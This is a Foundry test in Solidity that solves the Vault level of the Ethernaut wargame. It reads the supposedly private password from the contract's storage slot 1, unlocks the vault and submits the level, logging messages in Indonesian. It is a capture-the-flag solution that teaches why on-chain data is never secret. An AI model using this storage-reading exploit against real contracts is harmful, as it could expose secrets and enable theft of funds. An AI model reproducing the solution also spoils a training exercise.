// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IVault {
    function unlock(bytes32 _password) external;
    function locked() external view returns (bool);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautVaultTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;

    function testLevel8_Vault() public {

        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        IVault vault = IVault(levelAddr);
        console.log("Status Awal Locked:", vault.locked());

        console.log("Mengintip Slot 1 memori...");
        
        bytes32 password = vm.load(levelAddr, bytes32(uint256(1)));
        
        console.log("Password Ditemukan:");
        console.logBytes32(password);

        vault.unlock(password);

        console.log("Status Akhir Locked:", vault.locked());
        assertEq(vault.locked(), false);
        console.log("HACKED! Brankas terbuka.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}